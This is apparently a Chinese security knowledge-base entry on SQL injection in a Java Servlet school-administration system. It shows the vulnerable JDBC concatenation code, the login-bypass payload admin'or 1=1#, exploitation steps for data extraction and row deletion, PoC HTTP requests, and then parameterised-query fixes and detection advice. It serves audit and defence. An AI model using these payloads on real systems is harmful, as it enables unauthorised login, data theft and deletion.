---
id: web-generic-sqli-java-jdbc-statement-login-concat-multi-dao
title: Java Servlet 教务系统 JDBC Statement 拼接：check_login 用 admin'or 1=1# 登录绕过，同类 DAO 里 checkAccount/findWithId/findWithName/deleteStudent 六处共用一套未过滤拼接
type: scenario
domain: web
path: web/generic/sqli
technique: java-jdbc-statement-login-concat-multi-dao
tags:
- java
- servlet
- jdbc
- sqli
- login-bypass
- statement-concat
- jsp
- code-audit
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
url: /docs/web/generic/sqli/web-generic-sqli-java-jdbc-statement-login-concat-multi-dao/
draft: false
kb_aliases:
- Java Statement 拼接 SQL 注入
- Servlet 登录 SQL 注入
- check_login 注入
- admin'or 1=1#
- JDBC executeQuery 拼接
- DAO 多方法注入
- 教务系统 SQL 注入
---

## 一句话结论

这套 JSP/Servlet 教务系统把登录参数 `user`/`password` 直接拼进 `select * from student where id = '<user>' and password = '<password>'` 交给 `Statement.executeQuery()`，一个 `admin'or 1=1#` 就能让 `where` 恒真并取到结果集首行，从而以任意已存在账号身份登录；问题不在登录一处——同一套 DAO 里 `TeacherD.checkAccount/findWithId`、`StudentD.checkAccount/findWithId/findWithName/deleteStudent` 六个方法复制粘贴了同一种拼接，其中 `deleteStudent` 的注入点落在 `delete` 语句上。

## 原理

- **漏洞代码结构**（两个 DAO 完全同构）：
  ```java
  public Student checkAccount(String user, String password) throws Exception {
      initConnection();
      Statement stat = conn.createStatement();
      String sql = "select * from student where id = '" + user + "' and password = '" + password + "'";
      ResultSet rs = stat.executeQuery(sql);
      Student stu = getStudent(rs);
      closeConnection();
      return stu;
  }
  ```
  参数没有 `PreparedStatement`、没有 `setString`、没有 `replace`/过滤；单引号直接闭合 `id = '` 后的字符串字面量。
- **为什么登录能绕过**：`check_login` 的 `doGet` 先取 `user`/`password`/`remember` 三个参数，再依次调用 `teacherD.checkAccount` 与 `studentD.checkAccount`。`user=admin'or 1=1#` 拼出
  ```sql
  select * from student where id = 'admin'or 1=1#' and password = '...'
  ```
  `#` 注释掉尾部密码条件，`or 1=1` 让 `where` 恒真；`getStudent(rs)` 只取结果集第一行，因此**不需要知道任何口令**就拿到一个登录态。原文用 `admin'or 1=1#` + 任意密码成功进入系统。
- **为什么同一 payload 在两个 DAO 都成立**：`check_login` 先查 teacher 再查 student，任一命中即登录。两处 SQL 除表名外完全一致，所以一个 payload 同时覆盖教师与学生两条身份线。
- **为什么这不是“登录绕过”而是“完整 SQL 注入”**：注入点位于 `where` 条件，攻击者可以改的远不止恒真：可 `union select` 回显其它表（`getStudent(rs)` 会把首行映射成 `Student` 对象，字段顺序对齐即可当回显位）、可用 `and (select ...)` 做布尔盲注、可堆叠。原文的报错回显（`MySQLSyntaxErrorException ... near ''1''`）已证明拼接未转义，sqlmap 可直接打。
- **同类方法一览与危害差异**：
  - `TeacherD.checkAccount` / `StudentD.checkAccount`：登录处，恒真即绕过认证（无需账号）。
  - `TeacherD.findWithId` / `StudentD.findWithId`：按 id 查人，被 `index.jsp`、`sendCode.jsp`、`one_page_student`、`score.jsp`、`score_excel.jsp` 等多处调用；这些页面通常已登录，但 `index.jsp`/`sendCode.jsp` 的 `user` 参数也可能在未登录流程里被拼进去（需按目标确认）。
  - `StudentD.findWithName`：按姓名模糊/精确查，`one_page_student` 传入 `key`，可注入。
  - `StudentD.deleteStudent`：`delete from student where id='<id>'`，注入点在删除条件上，危害是**任意行删除**（可配合子查询删除任意表满足条件行）。
- **为什么这类老系统普遍如此**：JDBC 的 `Statement` + 字符串拼接是 2000 年代 JSP 教学的默认写法；DAO 层没有统一的参数化封装，每个方法各自拼接，修一处漏一片。

## 触发条件

- 目标为 JSP/Servlet + MySQL 的教学/教务类老系统，登录接口暴露在公网或内网可访问。
- `check_login`（或同类登录 servlet）把请求参数直接拼进 `Statement.executeQuery()`。
- 数据库账号可执行 `select`（注入读数据所需；`deleteStudent` 需要 `delete` 权限）。
- 前端/网关未对 `user`/`password` 做引号与关键字拦截（老系统通常没有）。
- 登录失败分支会把异常直接 `out.print(e)` 回显（本系统即如此），报错注入条件更好。

## 利用步骤

1. **确认入口**：抓登录请求 `POST /web/check_login`，参数为 `user`、`password`、`remember`。
2. **确认拼接**：提交 `user=20162430634&password=1'`，若返回 `MySQLSyntaxErrorException ... near ''1''` 之类的 JDBC 异常与 SQL 片段，说明参数未转义、异常被回显。
3. **登录绕过**：`user=admin'or 1=1#&password=x`（或 URL 编码 `admin%27or%201%3D1%23`），观察是否直接进入主页面并带登录态。
4. **确认身份线**：同一 payload 对教师登录同样生效（`check_login` 会先查 teacher），可用来判断命中的是教师还是学生账号（页面差异/菜单差异）。
5. **转为数据提取**：登录后或直接在登录接口用 `union select` 对齐 `student` 表列数回显 `database()`、`user()`；若无法回显则用布尔/时间盲注（异常回显已确认，报错注入也可用）。
6. **横向同类点**：把 payload 换到 `one_page_student` 的 `key`（`findWithId`/`findWithName`）、`delete_student` 的 `id`，确认每个方法都能注入；`delete_student` 慎重，会真实删行。
7. **记录边界**：只验证到“可登录/可读库名”即可，不要在生产上跑 `delete` 或 `into outfile`。

## PoC

登录绕过（原文实测）：

```http
POST /web/check_login HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

user=admin'or 1=1%23&password=x&remember=
```

拼接结果：

```sql
select * from student where id = 'admin'or 1=1#' and password = 'x'
```

报错探测：

```http
POST /web/check_login HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

user=20162430634&password=1'
```

预期：响应体返回 `com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; ... near ''1''`。

删除型注入点（仅示意，勿在生产执行）：

```text
GET /web/delete_student?id=1' or (select 1 from (select 1)x)--
```

## 变体与关联

- 变体：`password` 参数同样可注入（`and password = '<pw>'`），可只在密码位闭合：`password=x' or 1=1#`。
- 变体：`findWithId`/`findWithName` 被 JSP 页面直接调用（`index.jsp:31`、`sendCode.jsp:36`、`main.jsp:58`），若这些页面在登录前可访问，就构成未授权注入；原文未逐页验证，需按目标实测。
- 变体：`deleteStudent` 的 `delete from student where id='<id>'` 是少见的“写型”注入点，可用于批量删数据或借子查询删其它表。
- 关联：[[web-generic-sqli-login-username-comment-universal-password]]（登录处注释符万能密码的同类形态）。
- 关联：[[web-generic-sqli-java-servlet-accountid-concat-boolean]]、[[web-generic-sqli-fe-system-jdbc-concat-treexml-editflow]]（同为 Java Servlet/JDBC 拼接注入）。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（对照：MyBatis 的 `${}` 与 JDBC `Statement` 拼接同属“应用层拼接”，修法都是换预编译/`#{}`）。
- 边界：仅 `select` 权限时无法堆叠写文件；若数据库为 Oracle/其它方言，注释符与报错格式需替换。

## 检测与防御

- 修复：全部换成 `PreparedStatement` + `setString`：
  ```java
  PreparedStatement ps = conn.prepareStatement("select * from student where id = ? and password = ?");
  ps.setString(1, user); ps.setString(2, password);
  ResultSet rs = ps.executeQuery();
  ```
- 加固：登录错误不要回显 JDBC 异常（`out.print(e)` 直接吐出 SQL 片段与堆栈）；统一 DAO 基类封装参数化查询，避免逐方法复制拼接。
- 加固：对 `deleteStudent` 这类写接口加二次确认与权限校验；`id` 做格式白名单（学号是数字）。
- 检测：代码审计中 grep `createStatement()`、`executeQuery("... \" + `、`executeUpdate("... \" + `；运行期对登录参数出现 `'`、`#`、`--`、`or 1=1`、`union` 告警。
- 检测：同一 IP 对登录接口高频提交含引号的参数、响应出现 `MySQLSyntaxErrorException`/`SQLException` 堆栈，是注入探测的强信号。
